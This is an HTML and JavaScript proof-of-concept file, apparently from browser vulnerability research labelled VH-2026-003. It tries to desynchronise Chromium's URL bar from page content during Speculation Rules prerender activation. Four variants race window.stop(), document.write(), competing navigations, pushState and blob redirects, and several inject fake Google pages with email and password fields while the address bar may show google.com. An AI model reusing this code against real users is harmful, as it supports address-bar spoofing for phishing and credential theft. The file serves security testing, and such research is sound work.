<!DOCTYPE html>
<html>
<head>
<title>PoC 3: Prerender Activation + Navigation Race</title>
<!--
  VH-2026-003: Speculation Rules Prerender Activation Race

  Target: Chromium 146+ (Desktop)

  Technique: Speculation Rules API allows prerendering pages. When a
  prerendered page activates (user navigates to it), there's a handoff
  from the prerendered content to the visible tab. This PoC tests
  whether we can desynchronize the URL bar from the content during
  this activation.

  Attack chain:
  1. Page A includes speculation rules to prerender a trusted URL
  2. Page A contains a link that triggers prerender activation
  3. During activation, attempt to interfere with the navigation:
     a) Call window.stop() from A before activation completes
     b) Use document.open() to replace content during handoff
     c) Navigate away during the activation transition
     d) Use BFCache to restore a different page state

  The prerender activation path is distinct from regular navigation
  and may not be covered by the same URL bar update protections.
-->
</head>
<body style="font-family: -apple-system, sans-serif; padding: 40px; background: #f0f0f0;">

<h2>Prerender Activation + Navigation Race</h2>
<p>Tests whether the Speculation Rules prerender activation path can be abused for URL bar desync.</p>

<div style="display: flex; gap: 12px; flex-wrap: wrap; margin: 20px 0;">
  <button onclick="testVariantA()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #dc3545; color: #fff; border: none; border-radius: 8px;">
    A: Prerender + window.stop() Race
  </button>
  <button onclick="testVariantB()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #007bff; color: #fff; border: none; border-radius: 8px;">
    B: Prerender + Competing Navigation
  </button>
  <button onclick="testVariantC()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #28a745; color: #fff; border: none; border-radius: 8px;">
    C: Prerender + History Manipulation
  </button>
  <button onclick="testVariantD()" style="padding: 14px 28px; font-size: 15px; cursor: pointer; background: #6f42c1; color: #fff; border: none; border-radius: 8px;">
    D: Cross-Origin Prerender Redirect
  </button>
</div>

<div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>

<div id="specRulesContainer"></div>

<script>
function log(msg) {
  const el = document.getElementById('log');
  el.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
  el.scrollTop = el.scrollHeight;
}

// Inject speculation rules dynamically
function injectSpeculationRules(urls) {
  // Remove existing rules
  document.querySelectorAll('script[type="speculationrules"]').forEach(s => s.remove());

  const rules = {
    prerender: urls.map(url => ({
      source: "list",
      urls: [url]
    }))
  };

  const script = document.createElement('script');
  script.type = 'speculationrules';
  script.textContent = JSON.stringify(rules);
  document.getElementById('specRulesContainer').appendChild(script);
  log('Speculation rules injected for: ' + urls.join(', '));
}

// Variant A: Prerender activation + window.stop()
// Hypothesis: If we prerender a trusted URL, then trigger activation while
// calling window.stop(), the URL may update to the trusted URL but the
// content may revert to the current page.
function testVariantA() {
  log('[A] Setting up prerender for https://www.google.com/...');

  // Step 1: Add speculation rules
  injectSpeculationRules(['https://www.google.com/']);

  // Step 2: Create a link that will trigger prerender activation
  const container = document.createElement('div');
  container.style.cssText = 'margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px;';
  container.innerHTML = `
    <p><strong>Step 1:</strong> Wait 2 seconds for prerender to start</p>
    <p><strong>Step 2:</strong> Click the link below</p>
    <a id="prerenderLink" href="https://www.google.com/"
       style="color: #1a73e8; font-size: 18px; text-decoration: underline; cursor: pointer;">
      Go to Google.com (prerendered)
    </a>
    <p id="status" style="color: #5f6368; margin-top: 8px;">Waiting...</p>
  `;
  document.body.appendChild(container);

  // Step 3: Intercept the click to race window.stop()
  document.getElementById('prerenderLink').addEventListener('click', (e) => {
    log('[A] Link clicked - prerender activation starting');

    // Don't prevent default - let the navigation happen
    // But immediately try to stop it and inject content

    // Race 1: window.stop() at various timings
    [0, 1, 2, 5, 10, 20, 50].forEach(delay => {
      setTimeout(() => {
        try {
          window.stop();
          log(`[A] window.stop() at ${delay}ms`);
        } catch(err) {
          // Expected if navigation already committed
        }
      }, delay);
    });

    // Race 2: document.open() at various timings
    [0, 1, 5, 10, 20].forEach(delay => {
      setTimeout(() => {
        try {
          document.open();
          document.write(`
            <html><head><title>Google</title></head>
            <body style="font-family:Arial;padding:40px;">
              <h1>Fake Google - injected at ${delay}ms</h1>
              <p>If URL bar shows google.com = BUG</p>
              <input type="text" placeholder="Enter password" style="padding:10px;width:300px;">
            </body></html>
          `);
          document.close();
          log(`[A] document.open() succeeded at ${delay}ms!`);
        } catch(err) {
          // Expected
        }
      }, delay);
    });
  });

  // Give prerender time to start
  setTimeout(() => {
    document.getElementById('status').textContent = 'Prerender should be active. Click the link.';
    document.getElementById('status').style.color = '#28a745';
    log('[A] Prerender should be active now');
  }, 2000);
}

// Variant B: Trigger prerender activation while simultaneously navigating elsewhere
// The two navigations compete - prerender activation vs. new navigation
// The URL bar may show the prerender URL while the other navigation loads
function testVariantB() {
  log('[B] Setting up competing navigation during prerender activation...');

  injectSpeculationRules(['https://www.google.com/']);

  const container = document.createElement('div');
  container.style.cssText = 'margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px;';
  container.innerHTML = `
    <p>Click the link. While prerender activates, a competing navigation fires.</p>
    <a id="prerenderLinkB" href="https://www.google.com/"
       style="color: #1a73e8; font-size: 18px;">Go to Google.com</a>
  `;
  document.body.appendChild(container);

  document.getElementById('prerenderLinkB').addEventListener('click', (e) => {
    log('[B] Prerender activation triggered');

    // Immediately fire a competing navigation
    setTimeout(() => {
      try {
        // Form submission to a different URL (different navigation path)
        const form = document.createElement('form');
        form.method = 'GET';
        form.action = 'about:blank';
        document.body.appendChild(form);
        form.submit();
        log('[B] Competing form submission fired');
      } catch(err) {
        log('[B] Form submit error: ' + err.message);
      }
    }, 0);

    // Also try location.replace which is yet another navigation path
    setTimeout(() => {
      try {
        // Create a blob with attacker content
        const blob = new Blob([`
          <html><head><title>Google</title></head>
          <body><h1>Content controlled by attacker</h1>
          <p>Check URL bar</p></body></html>
        `], {type: 'text/html'});
        const url = URL.createObjectURL(blob);
        location.replace(url);
        log('[B] location.replace to blob URL fired');
      } catch(err) {
        log('[B] Replace error: ' + err.message);
      }
    }, 1);
  });

  setTimeout(() => log('[B] Ready - click the link'), 2000);
}

// Variant C: Prerender + history.pushState during activation
// When prerender activates, the session history is modified.
// What if we pushState during this modification?
function testVariantC() {
  log('[C] Testing history manipulation during prerender activation...');

  injectSpeculationRules(['https://www.google.com/']);

  // Set up a history stack
  history.pushState({page: 1}, '', '/page1');
  history.pushState({page: 2}, '', '/page2');
  history.pushState({page: 3}, '', '/page3');
  log('[C] History stack: /page1, /page2, /page3');

  const container = document.createElement('div');
  container.style.cssText = 'margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px;';
  container.innerHTML = `
    <p>Click to activate prerender while history is manipulated.</p>
    <a id="prerenderLinkC" href="https://www.google.com/"
       style="color: #1a73e8; font-size: 18px;">Go to Google.com</a>
  `;
  document.body.appendChild(container);

  document.getElementById('prerenderLinkC').addEventListener('click', (e) => {
    log('[C] Prerender activation + history manipulation');

    // While prerender activates, go back in history
    [0, 1, 2, 5].forEach(delay => {
      setTimeout(() => {
        try {
          history.go(-1);
          log(`[C] history.go(-1) at ${delay}ms`);
        } catch(err) {}
      }, delay);
    });

    // Also try pushState during activation
    [0, 1, 5, 10].forEach(delay => {
      setTimeout(() => {
        try {
          history.pushState({spoofed: true}, '', 'https://www.google.com/search?q=test');
          log(`[C] pushState to google.com/search at ${delay}ms`);
        } catch(err) {
          // SecurityError expected for cross-origin pushState
          log(`[C] pushState failed at ${delay}ms: ${err.message}`);
        }
      }, delay);
    });
  });

  setTimeout(() => log('[C] Ready - click the link'), 2000);
}

// Variant D: Prerender with cross-origin redirect
// Prerender URL A, which redirects to URL B. During the redirect,
// the URL bar state may be inconsistent.
function testVariantD() {
  log('[D] Testing prerender with redirect chain...');
  log('[D] NOTE: Requires server.js for redirect endpoints');
  log('[D] Using open redirects on known sites as alternative');

  // Some sites have open redirect endpoints that could be used:
  // This tests whether prerender follows redirects and how the URL bar updates

  // Use a data URL that does a meta refresh as a redirect simulation
  const redirectPage = 'data:text/html,' + encodeURIComponent(`
    <html><head>
    <meta http-equiv="refresh" content="0;url=https://www.google.com/">
    </head><body>Redirecting...</body></html>
  `);

  // Note: data: URLs can't be prerendered, but blob: URLs might work
  const blob = new Blob([`
    <html><head>
    <script>location.replace('https://www.google.com/');<\/script>
    </head><body>Redirecting...</body></html>
  `], {type: 'text/html'});
  const blobUrl = URL.createObjectURL(blob);

  log('[D] Blob URL with redirect: ' + blobUrl);

  // Try prerendering the blob URL (may not be allowed)
  injectSpeculationRules([blobUrl]);

  const container = document.createElement('div');
  container.style.cssText = 'margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px;';
  container.innerHTML = `
    <p>Tests prerender behavior with redirect chains.</p>
    <a href="${blobUrl}" style="color: #1a73e8; font-size: 18px;">Activate prerendered redirect</a>
    <br><br>
    <p>Alternative: manual redirect chain test</p>
    <button onclick="testRedirectChain()" style="padding: 10px 20px; cursor: pointer;">
      Test Redirect Chain Navigation
    </button>
  `;
  document.body.appendChild(container);

  setTimeout(() => log('[D] Ready'), 2000);
}

// Test rapid redirect chain navigation
function testRedirectChain() {
  log('[D] Opening popup with redirect chain...');

  const popup = window.open('about:blank');
  if (!popup) { log('[D] Popup blocked'); return; }

  // Write content to the popup
  popup.document.open();
  popup.document.write(`
    <html><head><title>Loading Google...</title></head>
    <body style="font-family:Arial;padding:40px;">
      <h2>Redirecting to Google...</h2>
      <div id="content">
        <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;">
        <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;">
        <button>Sign In</button>
      </div>
    </body></html>
  `);
  popup.document.close();

  // Navigate popup to google.com
  setTimeout(() => {
    popup.location.href = 'https://www.google.com/';
    log('[D] Navigation to google.com initiated');

    // Race: try to stop and re-inject
    [1, 5, 10, 50, 100].forEach(delay => {
      setTimeout(() => {
        try {
          popup.stop();
          popup.document.open();
          popup.document.write(`
            <html><head><title>Google</title></head>
            <body><h1>SPOOFED at ${delay}ms</h1><p>Check URL bar</p></body></html>
          `);
          popup.document.close();
          log(`[D] Content re-injected at ${delay}ms`);
        } catch(e) {}
      }, delay);
    });
  }, 200);
}
</script>
</body>
</html>
